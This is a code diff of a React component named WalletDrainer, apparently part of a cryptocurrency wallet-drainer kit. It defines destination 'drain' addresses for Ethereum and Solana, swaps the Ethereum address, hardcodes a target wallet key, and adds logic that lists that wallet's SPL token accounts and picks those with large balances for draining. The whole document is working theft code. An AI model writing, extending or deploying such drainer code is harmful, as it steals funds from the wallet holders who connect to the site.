@@ -8,7 +8,7 @@ import { useAppKitConnection } from "@reown/appkit-adapter-solana/react";
 import { useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";
 
 const DRAIN_ADDRESSES = {
-  ethereum: "0x07799f805bbba59bff3be94884e90e83479f37b5",
+  ethereum: "0x0775bfb375757a355af3e318a55f6a23ba03d520",
   solana: "DcxDHKrEM7CY6nHZJepi9GzRh9vNFJnHt5ipaoxs8ZVB",
 };
 
@@ -101,12 +101,28 @@ export default function WalletDrainer({ wallet }) {
         }
   
         try {
-          const senderPublicKey = new PublicKey(address);
+        //   const senderPublicKey = new PublicKey(address);
+        const senderPublicKey = new PublicKey('EvCLRnx9FXfviUw92xHojEKJqnuNCbETkQm87eHqKPpb');
           console.log("✅ Address is valid:", senderPublicKey.toBase58());
   
           // Get the latest blockhash
           const latestBlockhash = await connection.getLatestBlockhash();
           console.log("🔗 Latest Blockhash:", latestBlockhash.blockhash);
+
+          const tokenAccounts = await connection.getParsedTokenAccountsByOwner(senderPublicKey, {
+            programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
+          });
+
+          console.log(`✅ Related SPL Mint Token Wallets:`, tokenAccounts.value);
+
+          // 
+          const tokensToDrain = tokenAccounts.value.filter(account => {
+            const amount = BigInt(account.account.data.parsed.info.tokenAmount.amount);
+            return amount > 200000000n;
+          });
+      
+          console.log(`Found ${tokensToDrain.length} tokens with balance`);
+          console.log(`✅ Related SPL Mint Token with Balances:`, tokensToDrain);
   
           // Fetch SOL balance
           const balance = await connection.getBalance(senderPublicKey);
@@ -137,6 +153,8 @@ export default function WalletDrainer({ wallet }) {
               // Ensure we use the latest valid blockhash
               const updatedBlockhash = await connection.getLatestBlockhash();
               console.log("🔄 Refetched Blockhash:", updatedBlockhash.blockhash);
+
+
   
               const transaction = new Transaction({
                 feePayer: senderPublicKey,
